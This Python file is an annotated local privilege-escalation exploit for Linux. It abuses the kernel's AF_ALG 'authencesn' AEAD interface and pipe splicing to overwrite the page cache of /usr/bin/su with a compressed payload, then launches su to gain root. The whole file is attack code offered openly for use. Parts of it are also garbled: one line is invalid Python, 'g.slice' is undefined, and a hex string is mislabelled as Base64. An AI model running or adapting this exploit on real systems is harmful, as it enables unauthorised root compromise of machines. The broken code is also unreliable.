import os
import zlib
import socket

#Base64-encoded byte payload
PAYLOAD = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

''' Function d() --> toBytes() '''
def toBytes(_hex):
    return bytes.fromhex(_hex)

'''
Variable Translations

Parameters (f,t,c) --> (file,index,byteData)

a = ALFSocket
h = sockLevel
v = sockOptObj
u = client
_ = addr
o = o
i = i
r,w = read, write
n = n
'''
def c(file, index, byteData):
    #Socket family=38 (AF_ALG), type=5 (SOCK_SEQPACKET) , protocol=0 (default)
    ALFSocket = socket.socket(38, 5, 0)
    #Bind to authencesn AEAD template
    ALFSocket.bind(("aead",
                    "authencesn(hmac(sha256),cbc(aes))"))

    sockLevel = 279 #Exploit uses socket level 279
    sockOptObj = ALFSocket.setsockopt
    #level=279, optname=1 (ALG_SET_KEY), optval=bytes (key for authencesn)
    sockOptObj(sockLevel, 1, toBytes('0800010000000010'+'0'*64))
    #level=279, optname=5 (ALG_SET_AEAD_AUTHSIZE), set to 4 byte tag
    sockOptObj(sockLevel, 5, None, 4)
    
    client, addr = ALFSocket.accept()
    
    o = index+4
    i = toBytes('00')

    client.sendmsg([b"A"*4+byteData], [(sockLevel, 3, i*4),
                                       (sockLevel,2,b'\x10'+i*19),
                                       (sockLevel, 4, b'\x08'+i*3),
                                       ], 32768)
    
    read, write = os.pipe()
    n = g.slice
    n = (file, write, o, offset_src=0)
    n(read, client.fileno(), o)

    try:
        client.recv(8+index)
    except:
        return 0

file = os.open("/usr/bin/su", 0)
i = 0
decomp = zlib.decompress(toBytes(PAYLOAD))

while i<len(decomp):
    c(file, i, decomp[i:i+4])
    i += 4

os.system("su")
